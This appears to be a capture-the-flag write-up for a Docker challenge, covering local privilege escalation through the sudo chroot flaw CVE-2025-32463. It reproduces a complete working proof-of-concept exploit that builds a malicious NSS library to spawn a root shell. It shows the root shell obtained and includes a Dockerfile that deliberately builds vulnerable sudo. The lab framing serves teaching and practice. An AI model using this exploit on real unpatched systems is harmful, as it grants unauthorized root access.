

# Challenge 10 GetmeROOT!

## Description

The objective of this challenge is gain root access from a non-root user within the docker container and execute a script which will provide the flag. 

# Solution
**1. Start the Docker Container.**

We will need to build and run the docker container from the provided Dockerfile using the following commands:

    docker build -t challenge10 .
    docker run -it --rm challenge10

**2. Discover the flag binary**

Within the root directory of the docker container notice that there is a binary `flag` which when executed provides the following error and cannot be read. 

    └─$ docker run -it --rm  challenge10 
    catchmeoutside@47dd04f79a06:~$ ./flag 
    Error: must be run with sudo/root privileges.
    catchmeoutside@47dd04f79a06:~$ cat flag 
    cat: flag: Permission denied
    catchmeoutside@47dd04f79a06:~$ 


**3. Check Sudo Version**

This docker container contains a vulnerable sudo version 1.9.16p2 as shown below:

    catchmeoutside@47dd04f79a06:~$ sudo --version
    Sudo version 1.9.16p2
    Sudoers policy plugin version 1.9.16p2
    Sudoers file grammar version 50
    Sudoers I/O plugin version 1.9.16p2
    Sudoers audit plugin version 1.9.16p2

This sudo package is vulnerable to CVE-2025-32463 and as such a PoC exploit can be found easily online such as here:
https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh 

    exploit.sh 
    #!/bin/bash
    # sudo-chwoot.sh
    # CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
    #                  @ Stratascale Cyber Research Unit (CRU)
    STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
    cd ${STAGE?} || exit 1
    
    cat > woot1337.c<<EOF
    #include <stdlib.h>
    #include <unistd.h>
    
    __attribute__((constructor)) void woot(void) {
      setreuid(0,0);
      setregid(0,0);
      chdir("/");
      execl("/bin/bash", "/bin/bash", NULL);
    }
    EOF
    
    mkdir -p woot/etc libnss_
    echo "passwd: /woot1337" > woot/etc/nsswitch.conf
    cp /etc/group woot/etc
    gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
    
    echo "woot!"
    sudo -R woot woot
    rm -rf ${STAGE?}

**4. Copy the PoC exploit within the docker container**

Using `nano` we can copy the PoC exploit within the docker container as shown below. 

    catchmeoutside@47dd04f79a06:~$ nano exploit.sh  
    catchmeoutside@47dd04f79a06:~$ cat exploit.sh 
    #!/bin/bash
    # sudo-chwoot.sh
    # CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
    #                  @ Stratascale Cyber Research Unit (CRU)
    STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
    cd ${STAGE?} || exit 1
    
    cat > woot1337.c<<EOF
    #include <stdlib.h>
    #include <unistd.h>
    
    __attribute__((constructor)) void woot(void) {
      setreuid(0,0);
      setregid(0,0);
      chdir("/");
      execl("/bin/bash", "/bin/bash", NULL);
    }
    EOF
    
    mkdir -p woot/etc libnss_
    echo "passwd: /woot1337" > woot/etc/nsswitch.conf
    cp /etc/group woot/etc
    gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
    
    echo "woot!"
    sudo -R woot woot
    rm -rf ${STAGE?}
    catchmeoutside@47dd04f79a06:~$ 

**5. Execute the PoC exploit**

To execute this PoC we first need to modify the files permission after which we can execute. Both steps are shown below:

    catchmeoutside@47dd04f79a06:~$ chmod +x exploit.sh 
    catchmeoutside@47dd04f79a06:~$ bash exploit.sh 
    woot!
    root@47dd04f79a06:/# whoami
    root
    root@47dd04f79a06:/# id 
    uid=0(root) gid=0(root) groups=0(root),1001(catchmeoutside)
    root@47dd04f79a06:/#

 As we can see from the `whoami` and `id` commands above, we have gained root access. 


**6. Execute Flag executable**

We can proceed to execute the `flag` executable now that we have root privileges. As shown below

    root@47dd04f79a06:/# ./home/catchmeoutside/flag 
    Implant executed. Flag dropped.

**7. Read the file saved to the root directory** 

We can now read the flag implanted within the home directory. To get a hint for the path you can cat the `flag` executable which will show the path the implanted file. 
    
    root@47dd04f79a06:/# cat /root/flag_revealed.txt 
    Flag{damn_you_got_me_outside}
    root@47dd04f79a06:/# 
From above we can see that the flag is `Flag{damn_you_got_me_outside}`
The challenge is solved!


# Recreating this challenge 
Recreating this challenge is simple however requires a few steps.

**1. Create the Dockerfile**

To create the dockerfile copy the following code in to a file named  `Dockerfile`:

    # ----- Dockerfile -----
    
    FROM ubuntu:24.04
    ENV DEBIAN_FRONTEND=noninteractive
    
    # 1) Build tool and deps
    RUN apt-get update && \
    apt-get install -y build-essential wget nano libpam0g-dev libselinux1-dev zlib1g-dev \
    pkg-config libssl-dev git ca-certificates && \
    rm -rf /var/lib/apt/lists/*
    
    # 2) Build vulnerable sudo(1.9.16p2)
    WORKDIR /opt
    RUN wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz && \
    tar xzf sudo-1.9.16p2.tar.gz && \
    cd sudo-1.9.16p2 && \
    ./configure --disable-gcrypt --prefix=/usr && make && make install
    
    # 3) Make a pwn user
    RUN useradd -m -s /bin/bash catchmeoutside
    
    # 4) Copy PoC script
    #COPY exploit.sh /home/catchmeoutside/test.sh
    #RUN chown catchmeoutside:catchmeoutside /home/catchmeoutside/test.sh
    
    COPY flag /home/catchmeoutside/flag
    RUN chown root:root /home/catchmeoutside/flag
    RUN chmod 511 /home/catchmeoutside/flag
    
    # 5) Swith to the pwn user
    USER catchmeoutside
    WORKDIR /home/catchmeoutside
    
    # 6) Run shell
    CMD ["/bin/bash"]


**2. Create the flag executable**

Create a file called `flag.c` with the following contents:

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    int main() {
        if (geteuid() != 0) {
            fprintf(stderr, "Error: must be run with sudo/root privileges.\n");
            return 1;
        }
    
        FILE *fp = fopen("/root/flag_revealed.txt", "w");
        if (fp == NULL) {
            perror("Failed to write flag");
            return 1;
        }
    
        fprintf(fp, "Flag{damn_you_got_me_outside}\n");
        fclose(fp);
    
        printf("Implant executed. Flag dropped.\n");
        return 0;
    }

Feel free to change the flag `Flag{damn_you_got_me_outside}` and the path of the `/root/flag_revealed.txt` file as like. 

**3. Compile flag.c**

The last step is to compile the flag.c file to create the executable and set it's executable permissions as shown below.  

    └─$ gcc flag.c -o flag     
    
    └─$ chmod +x flag              



Perform the steps from the solution to validate that this challenge has been successfully created. 
This completes the recreation of this CTF Challenge. 













